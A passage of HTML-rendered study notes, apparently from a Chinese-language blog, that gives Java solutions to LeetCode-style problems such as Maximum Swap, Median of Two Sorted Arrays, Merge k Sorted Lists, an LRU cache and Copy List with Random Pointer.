<span class="keyword">if</span>(map.containsKey(nums[i]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;map.get(nums[i]),i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> map.put(target-nums[i],i);</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="maximum-swap">Maximum Swap √</span></h2><p>Given a non-negative integer, you could swap two digits <strong>at most</strong> once to get the maximum valued number. Return the maximum valued number you could get.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 2736</span><br><span class="line">Output: 7236</span><br><span class="line">Explanation: Swap the number 2 and the number 7.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 9973</span><br><span class="line">Output: 9973</span><br><span class="line">Explanation: No swap.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximumSwap</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] a = Integer.toString(num).toCharArray();</span><br><span class="line">        <span class="keyword">char</span>[] n=<span class="keyword">new</span> <span class="keyword">char</span>[a.length];</span><br><span class="line">        <span class="keyword">char</span>[] m=<span class="keyword">new</span> <span class="keyword">char</span>[a.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line">            n[i]=a[i];</span><br><span class="line">            m[i]=a[i];</span><br><span class="line">        &#125;        </span><br><span class="line">        Arrays.sort(n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=a.length-<span class="number">1</span>,j=<span class="number">0</span>;i&gt;=<span class="number">0</span>;i--,j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(n[i]!=m[j])&#123;</span><br><span class="line">                swap(m,j,find(m,n[i]));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Integer.valueOf(<span class="keyword">new</span> String(m));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span>[] m,<span class="keyword">char</span> v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=m.length-<span class="number">1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(v==m[i]) <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">char</span> a[],<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> tmp=a[i];</span><br><span class="line">        a[i]=a[j];</span><br><span class="line">        a[j]=tmp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>O(n)解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximumSwap</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] A = Integer.toString(num).toCharArray();</span><br><span class="line">        <span class="keyword">int</span>[] last = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length; i++) &#123;</span><br><span class="line">            last[A[i] - <span class="string">'0'</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> d = <span class="number">9</span>; d &gt; A[i] - <span class="string">'0'</span>; d--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (last[d] &gt; i) &#123;</span><br><span class="line">                    <span class="keyword">char</span> tmp = A[i];</span><br><span class="line">                    A[i] = A[last[d]];</span><br><span class="line">                    A[last[d]] = tmp;</span><br><span class="line">                    <span class="keyword">return</span> Integer.valueOf(<span class="keyword">new</span> String(A));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="median-of-two-sorted-arrays">Median of Two Sorted Arrays</span></h2><p>There are two sorted arrays <strong>nums1</strong> and <strong>nums2</strong> of size m and n respectively.</p><p>Find the median of the two sorted arrays. The overall run time complexity should be O(log (m+n)).</p><p>You may assume <strong>nums1</strong> and <strong>nums2</strong> cannot be both empty.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nums1 &#x3D; [1, 3]</span><br><span class="line">nums2 &#x3D; [2]</span><br><span class="line"></span><br><span class="line">The median is 2.0</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nums1 &#x3D; [1, 2]</span><br><span class="line">nums2 &#x3D; [3, 4]</span><br><span class="line"></span><br><span class="line">The median is (2 + 3)&#x2F;2 &#x3D; 2.5</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = nums1.length;</span><br><span class="line">        <span class="keyword">int</span> n = nums2.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (m &gt; n) </span><br><span class="line">            <span class="keyword">return</span> findMedianSortedArrays(nums2, nums1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, imin = <span class="number">0</span>, imax = m, half = (m + n + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">double</span> maxLeft = <span class="number">0</span>, minRight = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(imin &lt;= imax)&#123;</span><br><span class="line">             i = imin + (imax-imin) / <span class="number">2</span>;</span><br><span class="line">            j = half - i;</span><br><span class="line">            <span class="keyword">if</span>(j &gt; <span class="number">0</span> &amp;&amp; i &lt; m &amp;&amp; nums2[j - <span class="number">1</span>] &gt; nums1[i])&#123;</span><br><span class="line">                imin = i + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; j &lt; n &amp;&amp; nums1[i - <span class="number">1</span>] &gt; nums2[j])&#123;</span><br><span class="line">                imax = i - <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                    maxLeft = (<span class="keyword">double</span>)nums2[j - <span class="number">1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(j == <span class="number">0</span>)&#123;</span><br><span class="line">                    maxLeft = (<span class="keyword">double</span>)nums1[i - <span class="number">1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    maxLeft = (<span class="keyword">double</span>)Math.max(nums1[i - <span class="number">1</span>], nums2[j - <span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((m + n) % <span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> maxLeft;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i == m)&#123;</span><br><span class="line">            minRight = (<span class="keyword">double</span>)nums2[j];</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(j == n)&#123;</span><br><span class="line">            minRight = (<span class="keyword">double</span>)nums1[i];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            minRight = (<span class="keyword">double</span>)Math.min(nums1[i], nums2[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">double</span>)(maxLeft + minRight) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="swap-adjacent-in-lr-string">Swap Adjacent in LR String</span></h2><p>In a string composed of <code>&#39;L&#39;</code>, <code>&#39;R&#39;</code>, and <code>&#39;X&#39;</code> characters, like <code>&quot;RXXLRXRXL&quot;</code>, a move consists of either replacing one occurrence of <code>&quot;XL&quot;</code> with <code>&quot;LX&quot;</code>, or replacing one occurrence of <code>&quot;RX&quot;</code> with <code>&quot;XR&quot;</code>. Given the starting string <code>start</code> and the ending string <code>end</code>, return <code>True</code> if and only if there exists a sequence of moves to transform one string to the other.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: start &#x3D; &quot;RXXLRXRXL&quot;, end &#x3D; &quot;XRLXXRRLX&quot;</span><br><span class="line">Output: True</span><br><span class="line">Explanation:</span><br><span class="line">We can transform start to end following these steps:</span><br><span class="line">RXXLRXRXL -&gt;</span><br><span class="line">XRXLRXRXL -&gt;</span><br><span class="line">XRLXRXRXL -&gt;</span><br><span class="line">XRLXXRRXL -&gt;</span><br><span class="line">XRLXXRRLX</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canTransform</span><span class="params">(String start, String end)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">char</span>[] s=start.toCharArray();</span><br><span class="line">       <span class="keyword">char</span>[] e=end.toCharArray();</span><br><span class="line">       <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span>(s.length!=e.length) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(s[i]==<span class="string">'X'</span>) cnt++;</span><br><span class="line">           <span class="keyword">if</span>(e[i]==<span class="string">'X'</span>) cnt--;</span><br><span class="line">       &#125;        </span><br><span class="line">       <span class="keyword">if</span>(cnt!=<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       <span class="keyword">int</span> p1 = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">int</span> p2 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (p1 &lt; start.length()) &#123;           </span><br><span class="line">       <span class="keyword">while</span> (p1 &lt; s.length &amp;&amp; s[p1] == <span class="string">'X'</span>) p1++;</span><br><span class="line">       <span class="keyword">while</span> (p2 &lt; e.length &amp;&amp; e[p2] == <span class="string">'X'</span>) p2++;</span><br><span class="line">       <span class="keyword">if</span> (p1 == s.length &amp;&amp; p2 == e.length) <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">       <span class="keyword">if</span> (p1 == s.length || p2 == e.length) <span class="keyword">return</span> <span class="keyword">false</span>;  </span><br><span class="line">       <span class="keyword">if</span>(s[p1] != e[p2]) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">          </span><br><span class="line">       <span class="keyword">if</span> (s[p1] == <span class="string">'R'</span> &amp;&amp; p1 &gt; p2) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       <span class="keyword">if</span> (s[p1] == <span class="string">'L'</span> &amp;&amp; p1 &lt; p2) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       p1++;</span><br><span class="line">       p2++;</span><br><span class="line">   &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="链表">链表</span></h1><h2><span id="merge-k-sorted-lists-">Merge k Sorted Lists -</span></h2><p>Merge <em>k</em> sorted linked lists and return it as one sorted list. Analyze and describe its complexity.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  1-&gt;4-&gt;5,</span><br><span class="line">  1-&gt;3-&gt;4,</span><br><span class="line">  2-&gt;6</span><br><span class="line">]</span><br><span class="line">Output: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeKLists</span><span class="params">(ListNode[] lists)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(lists==<span class="keyword">null</span>||lists.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        PriorityQueue&lt;ListNode&gt; q = <span class="keyword">new</span> PriorityQueue&lt;ListNode&gt;(lists.length, (a,b)-&gt; a.val-b.val);</span><br><span class="line">        ListNode dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode tail=dummy;</span><br><span class="line">         <span class="keyword">for</span> (ListNode node:lists)</span><br><span class="line">            <span class="keyword">if</span> (node!=<span class="keyword">null</span>)</span><br><span class="line">                q.add(node);</span><br><span class="line">         <span class="keyword">while</span> (!q.isEmpty())&#123;</span><br><span class="line">            tail.next=q.poll();</span><br><span class="line">            tail=tail.next;            </span><br><span class="line">            <span class="keyword">if</span> (tail.next!=<span class="keyword">null</span>)</span><br><span class="line">                q.add(tail.next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="lru-">LRU -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRU</span></span>&#123;</span><br><span class="line">    HashMap&lt;Integer,Node&gt; map = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="keyword">int</span> cap=<span class="number">0</span>,cnt=<span class="number">0</span>;</span><br><span class="line">    Node tail,head;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        Node pre,next;</span><br><span class="line">        <span class="keyword">int</span> key,val;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">int</span> key,<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.key=key;</span><br><span class="line">            <span class="keyword">this</span>.val=val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRU</span><span class="params">(<span class="keyword">int</span> cap)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cap=cap;</span><br><span class="line">        head=<span class="keyword">new</span> Node();</span><br><span class="line">        tail=<span class="keyword">new</span> Node();</span><br><span class="line">        head.next=tail;</span><br><span class="line">        tail.pre=head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">        Node tmp = map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="keyword">null</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        remove(tmp);</span><br><span class="line">        add(tmp);</span><br><span class="line">        <span class="keyword">return</span> tmp.val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key,<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">        Node tmp = map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="keyword">null</span>)&#123;</span><br><span class="line">            Node n=<span class="keyword">new</span> Node(key,val);</span><br><span class="line">            add(n);</span><br><span class="line">            map.put(key,n);</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            tmp.val=val;</span><br><span class="line">           remove(tmp);</span><br><span class="line">            add(tmp);</span><br><span class="line">        &#125;<span class="keyword">if</span>(cnt&gt;cap)&#123;</span><br><span class="line">            map.remove(tail.pre.key);</span><br><span class="line">            remove(tail.pre);            </span><br><span class="line">            cnt--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Node n)</span></span>&#123;</span><br><span class="line">        Node next=head.next;</span><br><span class="line">        head.next=n;</span><br><span class="line">        n.pre=head;</span><br><span class="line">        next.pre=n;</span><br><span class="line">        n.next=next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(Node n)</span></span>&#123;</span><br><span class="line">        Node before=n.pre,after=n.next;</span><br><span class="line">        before.next=after;</span><br><span class="line">        after.pre=before;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="reverse-nodes-in-k-group-">Reverse Nodes in K-group -</span></h2><p>Given a linked list, reverse the nodes of a linked list <em>k</em> at a time and return its modified list.</p><p><em>k</em> is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of <em>k</em> then left-out nodes in the end should remain as it is.</p><p><strong>Example:</strong></p><p>Given this linked list: <code>1-&gt;2-&gt;3-&gt;4-&gt;5</code></p><p>For <em>k</em> = 2, you should return: <code>2-&gt;1-&gt;4-&gt;3-&gt;5</code></p><p>For <em>k</em> = 3, you should return: <code>3-&gt;2-&gt;1-&gt;4-&gt;5</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseKGroup</span><span class="params">(ListNode head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">       <span class="keyword">int</span> len = calLen(head,<span class="number">0</span>);</span><br><span class="line">       ListNode dummy=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">       dummy.next=head;</span><br><span class="line">       <span class="keyword">int</span> cyc=len/k;</span><br><span class="line">       ListNode pre=dummy,l1=head,l2=head;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;cyc;i++)&#123;            </span><br><span class="line">           <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;k;j++)&#123;</span><br><span class="line">               l2=l2.next;</span><br><span class="line">           &#125;</span><br><span class="line">           ListNode next=l2.next;</span><br><span class="line">           l2.next=<span class="keyword">null</span>;</span><br><span class="line">           ListNode tmp=l1;</span><br><span class="line">           reverse(l1);</span><br><span class="line">           pre.next=l2;</span><br><span class="line">           tmp.next=next;</span><br><span class="line">           pre=tmp;</span><br><span class="line">           l1=next;</span><br><span class="line">           l2=next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> dummy.next;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">calLen</span><span class="params">(ListNode head,<span class="keyword">int</span> res)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">       <span class="keyword">return</span> calLen(head.next,res+<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(ListNode root)</span></span>&#123;</span><br><span class="line">       ListNode head=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">       <span class="keyword">while</span>(root!=<span class="keyword">null</span>)&#123;</span><br><span class="line">           ListNode tmp = root.next;</span><br><span class="line">           root.next=head.next;</span><br><span class="line">           head.next=root;</span><br><span class="line">           root=tmp;</span><br><span class="line">       &#125;       </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="copy-list-with-random-pointer-">Copy List with Random Pointer -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Node <span class="title">copyRandomList</span><span class="params">(Node head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">        Node phead=head;</span><br><span class="line">        <span class="keyword">while</span>(phead!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            Node next=phead.next;</span><br><span class="line">            Node tmp = <span class="keyword">new</span> Node(phead.val);</span><br><span class="line">            phead.next=tmp;</span><br><span class="line">            tmp.next=next;</span><br><span class="line">            phead=next;</span><br><span class="line">        &#125;</span><br><span class="line">        phead=head;</span><br><span class="line">        <span class="keyword">while</span>(phead!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            Node next=phead.next;</span><br><span class="line">            Node r=phead.random;</span><br><span class="line">            <span class="keyword">if</span>(r!=<span class="keyword">null</span>)&#123;</span><br><span class="line">              next.random=r.next;</span><br><span class="line">            &#125;            </span><br><span class="line">            phead=next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        phead=head;</span><br><span class="line">        Node res=head.next;</span><br><span class="line">        <span class="keyword">while</span>(phead!=<span class="keyword">null</span>&amp;&amp;phead.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            Node next=phead.next;</span><br><span class="line">            phead.next=next.next;</span><br><span class="line">            phead=next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="merge-two-sorted-lists">Merge Two Sorted Lists √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 